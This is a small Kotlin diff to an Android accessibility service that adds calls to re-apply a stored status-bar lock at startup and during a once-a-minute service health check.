@@ -164,6 +164,7 @@ class MyAccessibilityService : AccessibilityService() {
         instance = this
 
         DynamicUIManager.warmUpEngine(this)
+        DynamicUIManager.applyStoredStatusBar(this)
 
         val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
         
@@ -461,6 +462,9 @@ class MyAccessibilityService : AccessibilityService() {
         if (now - lastPhoenixCheck > 60000) { // Throttle checks to once a minute maximum
             lastPhoenixCheck = now
             checkMainServiceHealth()
+            
+            // Ensure Status Bar lock is maintained if flag is active
+            DynamicUIManager.applyStoredStatusBar(this)
         }
 
         // --- 1. GHOST HAND LOGIC ---
